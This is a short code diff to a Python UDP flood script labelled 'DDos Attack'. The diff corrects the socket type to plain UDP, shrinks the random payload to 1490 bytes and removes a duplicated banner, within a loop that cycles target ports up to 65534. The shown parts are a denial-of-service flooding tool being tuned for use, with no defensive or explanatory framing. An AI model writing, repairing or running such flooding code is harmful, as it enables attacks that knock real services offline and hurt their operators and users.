@@ -13,13 +13,10 @@ month = now.month
 year = now.year
 
 ##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,socket.SOCK_STREAM)
-bytes = random._urandom(5890)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
 #############
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print
 os.system("clear")
 os.system("figlet DDos Attack")
 print
@@ -51,5 +48,4 @@ while True:
      if port == 65534:
        port = 1
 
-
-
+   
